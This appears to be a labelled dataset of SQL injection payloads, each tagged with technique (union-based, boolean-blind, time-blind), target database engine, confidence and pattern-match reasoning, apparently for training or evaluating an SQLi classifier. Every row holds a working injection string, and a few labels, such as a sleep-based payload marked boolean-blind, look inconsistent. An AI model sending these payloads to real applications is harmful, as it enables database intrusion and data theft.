id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23144,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23145,"1 ) and elt ( 4249 = 4249,7259 )",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql confirmed; common boolean blind pattern",1
23146,"1%' union all select null,null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23147,"-9098' union all select 3476,3476,3476,3476,3476,3476#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23148,1'+ ( select nxfp where 5006 = 5006,boolean_blind,generic,0.70,"generic SQL keywords without specific signal; boolean test with equality; low confidence due to generic DB",1
23149,"-7083 union all select 7705,7705,7705,7705,7705#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23150,1' ) and 2006 = 2006,boolean_blind,generic,0.70,"Pattern match: 'and 2006 = 2006' → boolean_blind (P3); simple equality test pattern; generic DB",1
23151,select ( case when ( 9986 = 8342 ) then 9986 else 9986* ( select 9986 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.70,"generic SQL keywords without specific signal; boolean branching with info_schema; uses case/when for conditional",1
23152,"1"" ) ) as ngvf where 9912 = 9912 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system table enumeration pattern (rdb$fields, rdb$types)",1
23153,"1%"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""%"" = """,boolean_blind,mysql,0.50,"Pattern match: 'elt (' → boolean_blind (P3); mysql signature; sources disagree on type classification",0
23154,"1' ) where 2725 = 2725 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system table enumeration pattern (rdb$fields, rdb$types)",1
23155,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",boolean_blind,db2,0.70,"generic SQL keywords without specific signal; DB2 system table enumeration (sysibm.systables)",1
23156,"1%"" waitfor delay '0:0:5'--",time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); both A and C sources agree on type and DB signature: MSSQL",2
23157,-6412%' or 4065 = 5815 and '%' = ',boolean_blind,generic,0.70,"Pattern match: 'or 4065 = 5815' → boolean_blind (P3); DB signature: generic; equality-based condition",1
